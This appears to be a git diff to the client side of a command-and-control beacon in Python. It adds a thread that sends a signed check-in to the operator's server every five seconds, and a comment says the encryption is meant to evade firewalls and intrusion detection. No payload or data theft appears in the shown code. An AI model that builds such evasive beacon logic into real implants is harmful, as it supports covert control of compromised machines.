@@ -4,6 +4,12 @@ import urllib3
 import base64
 import json
 
+from datetime import datetime
+from zoneinfo import ZoneInfo
+import time
+
+from threading import Thread
+
 # Encryption libraries to prevent Firewall and IDS Detection
 from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
 
@@ -105,6 +111,7 @@ class Beacon:
 
         if req.status == 200 and req.json()["verified"]:
             print("Beacon authentication successful.")
+            self.start_heartbeat()
             return True
 
         print("Beacon authentication failed:", req.data)
@@ -164,6 +171,7 @@ class Beacon:
         if req.status == 200 and req.json()["verified"]:
             print("Beacon registered successfully.")
             self.store_beacon_identity()
+            self.start_heartbeat()
             return True
 
         if req.status == 409:
@@ -173,11 +181,40 @@ class Beacon:
         print("Beacon registration failed:", req.data)
         return False
 
-    def generate_signed_nonce(self):
-        pass
-    
-    def send_ping(self):
-        pass
-        
+    def generate_signed_ping_signature(self):
+        nonce = str(uuid.uuid4())
+        now = str(datetime.now(ZoneInfo("Asia/Kolkata")))
+
+        message = f"{self.beacon_id} || {now} || {nonce}"
+
+        message_signature = self.private_key.sign(message.encode("utf-8"))
+
+        return {
+            "encoded_signature": base64.b64encode(message_signature).decode("utf-8"),
+            "timestamp": now,
+            "nonce": nonce,
+            "message": message,
+        }
+
+    def heartbeat(self):
+        while True:
+            message = self.generate_signed_ping_signature()
+            json_data = {
+                "beacon_id": self.beacon_id,
+                "timestamp": message["timestamp"],
+                "nonce": message["nonce"],
+                "signature": message["encoded_signature"],
+                "message": message["message"],
+            }
+            heartbeat_request = urllib3.request(
+                "POST", f"{self.BASE_SERVER_URL}/api/heartbeat", json=json_data
+            )
+
+            time.sleep(5)
+
+    def start_heartbeat(self):
+        t1 = Thread(target=self.heartbeat)
+        t1.start()
+
 
 b1 = Beacon()
